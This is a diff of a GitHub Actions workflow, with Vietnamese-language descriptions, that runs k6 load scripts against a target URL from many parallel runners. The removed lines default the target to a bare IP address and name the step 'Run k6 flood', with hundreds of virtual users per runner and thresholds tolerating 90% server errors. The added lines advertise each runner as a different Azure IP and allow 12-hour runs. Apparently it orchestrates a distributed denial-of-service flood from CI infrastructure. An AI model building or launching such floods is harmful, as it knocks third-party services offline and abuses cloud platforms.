@@ -4,25 +4,17 @@ on:
   workflow_dispatch:
     inputs:
       target_url:
-        description: 'Target URL (mac dinh: IP goc)'
-        required: true
-        default: 'http://103.211.206.175/'
+        description: 'Target URL (de trong dung .env)'
+        required: false
+        default: ''
       runners:
-        description: 'So runner song song (toi da 20)'
+        description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
         required: true
-        default: '5'
-      max_vus:
-        description: 'VU moi runner'
-        required: true
-        default: '500'
+        default: '1'
       duration:
-        description: 'Thoi gian giu tai (VD: 3m, 10m)'
-        required: true
-        default: '5m'
-      ramp_duration:
-        description: 'Thoi gian ramp up'
-        required: true
-        default: '30s'
+        description: 'Override thoi gian giu tai VD: 5m, 30m (de trong dung STAGES trong .env)'
+        required: false
+        default: ''
 
 jobs:
   prepare:
@@ -40,7 +32,7 @@ jobs:
     needs: prepare
     name: "Runner ${{ matrix.runner }}"
     runs-on: ubuntu-latest
-    timeout-minutes: 120
+    timeout-minutes: 720
     strategy:
       fail-fast: false
       max-parallel: 20
@@ -51,24 +43,37 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Setup k6
+      - name: Setup k6 (native, khong Docker)
         uses: grafana/setup-k6-action@v1
 
-      - name: Show runner identity
+      - name: Tang ulimit (giong VPS)
         run: |
-          echo "Runner index: ${{ matrix.runner }}"
-          echo "Hostname: $(hostname)"
-          echo "Public IP: $(curl -sf https://api.ipify.org || echo unknown)"
+          ulimit -n 131072
+          echo "ulimit -n: $(ulimit -n)"
 
-      - name: Run k6 flood
-        run: k6 run sites/thanhhuyreal/test-script.js
-        env:
-          TARGET_URL:       ${{ github.event.inputs.target_url }}
-          STAGES:           "${{ github.event.inputs.ramp_duration }}:${{ github.event.inputs.max_vus }},${{ github.event.inputs.duration }}:${{ github.event.inputs.max_vus }},10s:0"
-          START_RATE:       "50"
-          PRE_VUS:          "100"
-          MAX_VUS:          ${{ github.event.inputs.max_vus }}
-          REQUEST_TIMEOUT:  "15s"
-          REQUEST_DELAY:    "0"
-          MAX_5XX_RATE:     "0.9"
-          MAX_TIMEOUT_RATE: "0.9"
+      - name: Runner info
+        run: |
+          echo "=== Runner ${{ matrix.runner }} ==="
+          echo "Hostname : $(hostname)"
+          echo "Public IP: $(curl -sf https://api.ipify.org || echo unknown)"
+          echo "CPU cores: $(nproc)"
+          echo "RAM free : $(free -m | awk '/Mem:/{print $4}') MB"
+
+      - name: Load .env va chay k6
+        run: |
+          set -a
+          source sites/thanhhuyreal/.env
+          set +a
+
+          # Override neu co input
+          [ -n "${{ github.event.inputs.target_url }}" ] && export TARGET_URL="${{ github.event.inputs.target_url }}"
+          [ -n "${{ github.event.inputs.duration }}" ]   && export STAGES="${STAGES%,*},${{ github.event.inputs.duration }}:${MAX_VUS},10s:0"
+
+          echo "TARGET_URL       = $TARGET_URL"
+          echo "STAGES           = $STAGES"
+          echo "MAX_VUS          = $MAX_VUS"
+          echo "REQUEST_TIMEOUT  = $REQUEST_TIMEOUT"
+
+          ulimit -n 131072
+
+          k6 run --no-usage-report sites/thanhhuyreal/test-script.js
